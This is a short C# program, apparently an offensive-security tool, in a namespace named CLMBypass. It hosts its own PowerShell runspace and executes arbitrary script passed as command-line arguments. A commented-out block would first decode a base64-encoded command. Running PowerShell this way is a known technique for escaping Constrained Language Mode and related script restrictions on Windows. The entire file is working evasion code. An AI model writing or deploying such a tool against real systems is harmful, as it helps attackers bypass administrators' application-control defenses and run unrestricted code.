using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Threading.Tasks;

namespace CLMBypass
{
    class Program
    {
        static void Main(string[] args)
        {
            //Verify command line argument
            if (args.Length == 0) return;

            //Create and open new runspace
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();

            //Create PowerShell object to execute command
            PowerShell ps = PowerShell.Create();
            ps.Runspace = runspace;

            /* Decode b64 encoded argument
             byte[] data = Convert.FromBase64String(args[0].ToString());
             string decodedString = System.Text.Encoding.UTF8.GetString(data);
             ps.AddScript(String.Join(" ", decodedString));*/

            //Execute commands passed as argument to PowerShell object
            ps.AddScript(String.Join(" ", args));
            Collection<PSObject> results = ps.Invoke();
            foreach (PSObject obj in results)
            {                             
                Console.WriteLine(obj.ToString());
            }
            runspace.Close();
        }
        
    }
}
